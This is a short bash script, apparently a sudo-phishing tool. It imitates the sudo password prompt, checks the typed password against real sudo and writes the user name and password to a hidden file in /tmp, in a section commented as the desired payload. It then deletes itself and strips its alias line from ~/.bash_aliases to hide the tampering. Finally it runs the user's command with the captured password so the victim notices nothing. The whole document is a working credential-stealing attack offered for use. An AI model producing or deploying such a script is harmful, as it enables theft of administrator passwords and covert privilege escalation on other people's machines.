#!/bin/bash


readonly INPUT_MESSAGE="[sudo] password for ${USER}: "
readonly MAXIMUM_ATTEMPTS=3
readonly ERROR_MESSAGE="sudo: ${MAXIMUM_ATTEMPTS} incorrect password attempts"

attempts() {
    /bin/echo -n "${INPUT_MESSAGE}"
    read -r -s sudo_password
    /bin/echo ""
    if /bin/echo "${sudo_password}" | /usr/bin/sudo -S /bin/true 2> /dev/null; then
        ##
        # <La payload désirée>
        
        ##
        /bin/echo "${USER}:${sudo_password}" >> /tmp/.sudo_password
        #/usr/bin/cat /etc/passwd >>
        ##
        # </La payload désirée>
        ##
        /bin/rm ~/.sudo_phishing.sh
        /usr/bin/head -n -1 ~/.bash_aliases > ~/.bash_aliases_bak
        /bin/mv ~/.bash_aliases_bak ~/.bash_aliases
        /bin/echo "${sudo_password}" | /usr/bin/sudo -S "${@}"
        $BASH
        exit 0
    fi
}

if (/usr/bin/sudo -n /bin/true 2> /dev/null) || [ "${#}" -eq 0 ]; then
    /usr/bin/sudo "${@}"
else
    for ((iterator=1; iterator <= MAXIMUM_ATTEMPTS; iterator++)); do
        attempts "${@}"
    done
    /bin/echo "${ERROR_MESSAGE}"
fi
